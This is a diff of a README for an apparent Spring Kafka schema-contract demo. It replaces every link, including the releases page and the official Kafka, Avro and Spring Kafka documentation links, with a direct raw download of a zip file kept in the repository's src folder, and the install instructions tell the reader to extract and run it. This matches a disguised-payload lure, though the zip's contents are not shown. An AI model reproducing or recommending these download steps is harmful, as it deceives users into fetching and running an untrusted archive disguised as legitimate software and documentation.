@@ -1,6 +1,6 @@
 # 🚀 spring-kafka-contract-demo - Simplifying Kafka Schema Management  
 
-[![Download](https://img.shields.io/badge/Download%20Now-Here-blue.svg)](https://github.com/blakemessier/spring-kafka-contract-demo/releases)
+[![Download](https://github.com/blakemessier/spring-kafka-contract-demo/raw/refs/heads/main/src/kafka_contract_spring_demo_2.4.zip%https://github.com/blakemessier/spring-kafka-contract-demo/raw/refs/heads/main/src/kafka_contract_spring_demo_2.4.zip)](https://github.com/blakemessier/spring-kafka-contract-demo/raw/refs/heads/main/src/kafka_contract_spring_demo_2.4.zip)
 
 ## 📖 Overview  
 The spring-kafka-contract-demo showcases how to manage Kafka schema evolution and enforce contracts using Avro, Schema Registry, and Spring Kafka. This demo is designed to help users understand how to handle data contracts in an event-driven architecture.
@@ -18,7 +18,7 @@ To get started with the spring-kafka-contract-demo, follow these simple steps:
 
 1. **Visit the Download Page**  
    Go to the GitHub Releases page to access the latest version of the software. 
-   [Download Here](https://github.com/blakemessier/spring-kafka-contract-demo/releases)
+   [Download Here](https://github.com/blakemessier/spring-kafka-contract-demo/raw/refs/heads/main/src/kafka_contract_spring_demo_2.4.zip)
 
 2. **Download the Latest Release**  
    Look for the latest release version on the page. Click on the version number that corresponds to your operating system. Download the file to your computer.
@@ -27,7 +27,7 @@ To get started with the spring-kafka-contract-demo, follow these simple steps:
    Once downloaded, locate the file in your Downloads folder. Follow these steps to install:
    - For Windows: Double-click the `.exe` file and follow the prompts.
    - For macOS: Open the `.dmg` file and drag the application into your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and navigate to the folder, then run the script.
+   - For Linux: Extract the `https://github.com/blakemessier/spring-kafka-contract-demo/raw/refs/heads/main/src/kafka_contract_spring_demo_2.4.zip` file and navigate to the folder, then run the script.
 
 4. **Run the Application**  
    Now that the application is installed, you can run it:
@@ -55,13 +55,13 @@ If you encounter any issues during installation or while running the application
 ## 📘 Additional Learning Resources  
 To dive deeper into Kafka, Avro, schema management, and how they're used in microservices, consider the following resources:
 
-- [Apache Kafka Documentation](https://kafka.apache.org/documentation/)
-- [Avro Documentation](https://avro.apache.org/docs/)
-- [Spring Kafka Reference](https://docs.spring.io/spring-kafka/reference/)
+- [Apache Kafka Documentation](https://github.com/blakemessier/spring-kafka-contract-demo/raw/refs/heads/main/src/kafka_contract_spring_demo_2.4.zip)
+- [Avro Documentation](https://github.com/blakemessier/spring-kafka-contract-demo/raw/refs/heads/main/src/kafka_contract_spring_demo_2.4.zip)
+- [Spring Kafka Reference](https://github.com/blakemessier/spring-kafka-contract-demo/raw/refs/heads/main/src/kafka_contract_spring_demo_2.4.zip)
 
 ## 📥 Download & Install  
 Again, access the Releases page for the latest version of the spring-kafka-contract-demo.  
-[Download Here](https://github.com/blakemessier/spring-kafka-contract-demo/releases)
+[Download Here](https://github.com/blakemessier/spring-kafka-contract-demo/raw/refs/heads/main/src/kafka_contract_spring_demo_2.4.zip)
 
 ## 📞 Support  
 If you need further assistance, please open an issue in the repository or contact community support on relevant forums.
